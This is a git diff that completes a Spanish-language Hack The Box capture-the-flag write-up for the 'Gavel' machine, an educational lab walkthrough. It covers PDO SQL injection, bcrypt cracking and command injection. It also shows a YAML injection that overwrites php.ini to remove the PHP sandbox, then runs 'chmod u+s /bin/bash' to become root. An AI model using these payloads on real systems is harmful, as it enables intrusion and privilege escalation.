@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Gavel - Hack The Box
-excerpt: "."
+excerpt: "Esta fue una máquina complicada. Después de analizar los escaneos, nos dirigimos a analizar la página web activa en el puerto 80, siendo una página de subasta de objetos mágicos. Aplicando Fuzzing, descubrimos que la página web alberga un repositorio de GitHub que logramos dumpear, resultando ser una copia completa de la página web activa. Analizando el código del repositorio descargado, descubrimos una página que es vulnerable a Inyecciones SQL (SQLi), a la que tenemos acceso una vez que nos logueamos, y vemos que otra página puede ser vulnerable a Inyección de Comandos (CI), pero solamente tenemos acceso a esta con credenciales de administrador. Primero, aplicamos Inyecciones SQL a PDO, lo que nos permite dumpear un usuario y su contraseña en Hash Bcrypt que logramos crackear. Utilizamos estas credenciales para autenticarnos en la página y logramos ganar acceso a un panel de administrador. Como vimos antes, este panel resulta ser vulnerable a Inyección de Comandos (CI), lo que nos permite ejecutar una Reverse Shell con la que ganamos acceso principal a la máquina víctima. Dentro, encontramos que el único usuario registrado, es el mismo que encontramos al aplicar las SQLi, por lo que al probar la misma contraseña nos deja autenticarnos como este, siendo así que aplicamos Password Reuse. Enumerando la máquina, descubrimos un directorio que contiene la configuración de un sandbox de PHP y también contiene una plantilla de un archivo YAML que sirve para las subastas de la página web. Aplicamos un bypass al Sandbox de PHP para poder aplicar YAML injection, con tal de inyectar un comando que le dé permisos SUID a la Bash, logrando así escalar privilegios y convertirnos en Root."
 date: 2025-12-02
 classes: wide
 header:
@@ -15,30 +15,55 @@ tags:
   - Linux
   - YAML
   - MySQL
+  - PHP Sandbox
+  - Git Repository
   - Web Enumeration
   - Fuzzing
   - BurpSuite
   - Dumping Git Repository
-  - Script Analysis
+  - Code Analysis
   - PDO SQL Injections
   - Cracking Hash
   - Cracking Bcrypt Hash
   - Command Injection (CI)
-  - 
-  - 
+  - Password Reuse
+  - YAML Deserialization
+  - YAML Injection
+  - Bypassing PHP Sandbox
+  - Privesc - YAML Deserialization
+  - Privesc - YAML Injection
+  - Privesc - Bypassing PHP Sandbox
   - OSCP Style
 ---
-![](/assets/images/htb-writeup-gavel/gavel.png)
+<p align="center">
+<img src="/assets/images/htb-writeup-gavel/gavel.png">
+</p>
 
-texto
+Esta fue una máquina complicada. Después de analizar los escaneos, nos dirigimos a analizar la página web activa en el **puerto 80**, siendo una página de subasta de objetos mágicos. Aplicando **Fuzzing**, descubrimos que la página web alberga un **repositorio de GitHub** que logramos dumpear, resultando ser una copia completa de la página web activa. Analizando el código del repositorio descargado, descubrimos una página que es vulnerable a **Inyecciones SQL (SQLi)**, a la que tenemos acceso una vez que nos logueamos, y vemos que otra página puede ser vulnerable a **Inyección de Comandos (CI)**, pero solamente tenemos acceso a esta con credenciales de administrador. Primero, aplicamos **Inyecciones SQL a PDO**, lo que nos permite dumpear un usuario y su contraseña en **Hash Bcrypt** que logramos crackear. Utilizamos estas credenciales para autenticarnos en la página y logramos ganar acceso a un panel de administrador. Como vimos antes, este panel resulta ser vulnerable a **Inyección de Comandos (CI)**, lo que nos permite ejecutar una **Reverse Shell** con la que ganamos acceso principal a la máquina víctima. Dentro, encontramos que el único usuario registrado, es el mismo que encontramos al aplicar las **SQLi**, por lo que al probar la misma contraseña nos deja autenticarnos como este, siendo así que aplicamos **Password Reuse**. Enumerando la máquina, descubrimos un directorio que contiene la configuración de un **sandbox de PHP** y también contiene una plantilla de un **archivo YAML** que sirve para las subastas de la página web. Aplicamos un **bypass al Sandbox de PHP** para poder aplicar **YAML injection**, con tal de inyectar un comando que le dé **permisos SUID** a la **Bash**, logrando así escalar privilegios y convertirnos en **Root**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *wappalizer*
+* *ffuf*
+* *gobuster*
+* *git-dumper*
+* *pip*
+* *python3*
+* *mkdir*
+* *ChatGPT*
+* *hashid*
+* *JohnTheRipper*
+* *tcpdump*
+* *ping*
+* *nc*
+* *grep*
+* *su*
+* *sudo*
+* *id*
+* *linpeas.sh*
+* *wget*
+* *bash*
 
 
 <br>
@@ -67,12 +92,12 @@ Herramientas utilizadas:
 				<li><a href="#SQLi">Aplicando PDO SQL Injections y Crackeando Hash Bcrypt</a></li>
 				<li><a href="#RCE">Aplicando Inyección de Comandos en Panel de Admin y Ganando Acceso a la Máquina Víctima</a></li>
 				<ul>
-					<li><a href="#"></a></li>
+					<li><a href="#PasswordReuse">Identificando Password Reuse y Autenticandonos como Usuario Auctioneer</a></li>
 				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#YAMLinjection">Aplicando YAML Injection para Realizar un Bypass a las Restricciones del PHP Sandbox y así Escalar Privilegios</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -702,13 +727,19 @@ Veamos qué es lo que sucede:
 <img src="/assets/images/htb-writeup-gavel/Captura12.png">
 </p>
 
-Para que se haga efectiva la ejecución, tenemos que hacer una puja del producto donde inyectamos el comando:
-
 <p align="center">
 <img src="/assets/images/htb-writeup-gavel/Captura13.png">
 </p>
 
+Para que se haga efectiva la ejecución, tenemos que hacer una puja del producto donde inyectamos el comando:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-gavel/Captura14.png">
+</p>
+
 No vemos un resultado como tal, pero parece que si se esta ejecutando algo.
+
+Notaras que la página se estara recargando cada segundo que pasa, por lo que hay una gran probabilidad de que nuestro comando se este ejecutando cada segundo.
 
 Para probar rapidamente si es que encontramos una forma de ejecutar comandos, podemos mandarnos una **traza ICMP** a nuestra máquina.
 
@@ -723,12 +754,6 @@ Usemos la misma sintaxis y manda un **ping** a tu IP:
 ```bash
 return system('ping Tu_IP');
 ```
-
-Pruebalo:
-
-<p align="center">
-<img src="/assets/images/htb-writeup-gavel/Captura14.png">
-</p>
 
 Observa el resultado en el **tcpdump**:
 ```bash
@@ -892,12 +917,22 @@ Este archivo solo sirve de ejemplo de como funciona el sistema de subastas de la
 
 Revisando el contenido del directorio `.config`, encontraremos un archivo **php.ini**:
 ```bash
-auctioneer@gavel:/opt/gavel$ cat .config/php/php.ini 
+auctioneer@gavel:/tmp/privesc$ cat /opt/gavel/.config/php/php.ini 
 engine=On
 display_errors=On
-open_basedir=
-disable_functions=
+display_startup_errors=On
+log_errors=Off
+error_reporting=E_ALL
+open_basedir=/opt/gavel
+memory_limit=32M
+max_execution_time=3
+max_input_time=10
+disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
+scan_dir=
+allow_url_fopen=Off
+allow_url_include=Off
 ```
+Este archivo parece que habilita un **sandbox de PHP**.
 
 Antes que nada, ¿qué es un archivo **php.ini**?:
 
@@ -907,13 +942,7 @@ Antes que nada, ¿qué es un archivo **php.ini**?:
 
 <br>
 
-Analizando este archivo con **ChatGPT**, nos indica que este archivo configura **PHP** sin ninguna medida de seguridad:
-* `engine=On` -> Habilita el motor de **PHP**.
-* `display_errors=On` -> Hace que **PHP** muestre los errores directamente en pantalla.
-* `open_basedir=` -> Directiva de **PHP** que limita la lectura/escritura de archivos a ciertos directorios permitidos, pero al estar vacio significa que no hay restricción de acceso a archivos.
-* `disable_functions=` -> Directiva para bloquear funciones peligrosas como `exec,system,shell_exec,passthru,proc_open`, pero al estar vacia podemos usar estas funciones, lo que nos permite ejecutar cualquier código.
-
-Parece que este archivo esta mal configurado, lo que nos permite ejecutar cualquier comando si lo inyectamos en un **archivo YAML**.
+Después de analizarlo con **ChatGPT**, nos indica que hay una forma de romper el sandbox para que podamos ejecutar cualquier comando, siendo que podemos aplicar una inyección para eliminar las restricciones que tiene este archivo **php.ini**.
 
 El problema es que necesitamos alguna herramienta que ejecute y aplique las reglas que inyectemos en un **archivo YAML**, pero no la tenemos.
 
@@ -938,11 +967,11 @@ Commands:
   stats                   Show Auction stats
   invoice                 Request invoice
 ```
-Este binario parece leer **archivos YAML** para crear nuevos objetos para la subasta.
+Este binario parece leer **archivos YAML** para crear nuevos objetos.
 
-Utilizaremos este binario para que lea un **archivo YAML** malicioso que contenga un comando que le de **permisos SUID** a la **Bash**.
+Utilizaremos este binario para que lea un **archivo YAML** malicioso que contenga un comando que elimine las restricciones del archivo **php.ini**.
 
-
+Para crear el **archivo YAML** malicioso, tendremos que seguir la siguiente sintaxis:
 ```bash
 name:
 description:
@@ -952,27 +981,86 @@ rule_msg:
 rule:
 ```
 
+Solamente completamos los campos con cosas random y en el campo **rule** inyectamos un comando que elimine las restricciones, quedando de esta forma:
 ```bash
-
+auctioneer@gavel:/tmp/privesc$ cat newPHPini.yaml 
+name: newPHPini
+description: cambiando PHP ini
+image: "berserk.jpg"
+price: 1000
+rule_msg: "new PHP ini"
+rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
 ```
 
+Ahora utilizamos el binario **gavel-util** para cargar el **archivo YAML** malicioso:
 ```bash
+auctioneer@gavel:/tmp/privesc$ gavel-util submit newPHPini.yaml
+Item submitted for review in next auction
+```
+Funcionó.
 
+Veamos los cambios en el archivo **php.ini**:
+```bash
+auctioneer@gavel:/tmp/privesc$ cat /opt/gavel/.config/php/php.ini
+engine=On
+display_errors=On
+open_basedir=
+disable_functions=
 ```
 
+Ya tenemos un archivo **php.ini** sin ninguna seguridad ni restricción:
+* `engine=On` -> Habilita el motor de **PHP**.
+* `display_errors=On` -> Hace que **PHP** muestre los errores directamente en pantalla.
+* `open_basedir=` -> Directiva de **PHP** que limita la lectura/escritura de archivos a ciertos directorios permitidos, pero al estar vacio significa que no hay restricción de acceso a archivos.
+* `disable_functions=` -> Directiva para bloquear funciones peligrosas como `exec,system,shell_exec,passthru,proc_open`, pero al estar vacia podemos usar estas funciones, lo que nos permite ejecutar cualquier código.
+
+Con esto listo, crearemos otro **archivo YAML** malicioso que inyecte un comando que le **permisos SUID** a la **Bash**:
 ```bash
-auctioneer@gavel:~$ /opt/gavel/rootbash -p
-rootbash-5.1# whoami
+name: privesc
+description: privesc on gavel
+image: "berserk.jpg"
+price: 1000
+rule_msg: "privesc"
+rule: system('chmod u+s /bin/bash'); return false;
+```
+
+Comprobémos los permisos de la **Bash**:
+```bash
+auctioneer@gavel:/tmp/privesc$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+```
+
+Ahora utilizamos el binario **gavel-util** para cargar el **archivo YAML** malicioso:
+```bash
+auctioneer@gavel:/tmp/privesc$ gavel-util submit privesc.yaml
+Item submitted for review in next auction
+```
+Funcionó.
+
+Puedes revisar de nuevo los permisos de la **Bash**:
+```bash
+auctioneer@gavel:/tmp/privesc$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+```
+La **Bash** ya tiene **permisos SUID**.
+
+Ejecutemos la **Bash** con privilegios:
+```bash
+auctioneer@gavel:/tmp/privesc$ bash -p
+bash-5.1# whoami
 root
 ```
+Somos **Root**.
 
+Obtengamos la última flag:
 ```bash
-rootbash-5.1# cd /root
-rootbash-5.1# ls
+bash-5.1# cd /root
+bash-5.1# ls
 root.txt  scripts
-rootbash-5.1# cat root.txt
+bash-5.1# cat root.txt
 ...
 ```
+Y con esto, terminamos la máquina.
 
 
 <br>
@@ -983,9 +1071,9 @@ rootbash-5.1# cat root.txt
 
 
 * https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/
-* 
-* 
-* 
+* https://github.com/peass-ng/PEASS-ng
+* https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
 
 
 <br>
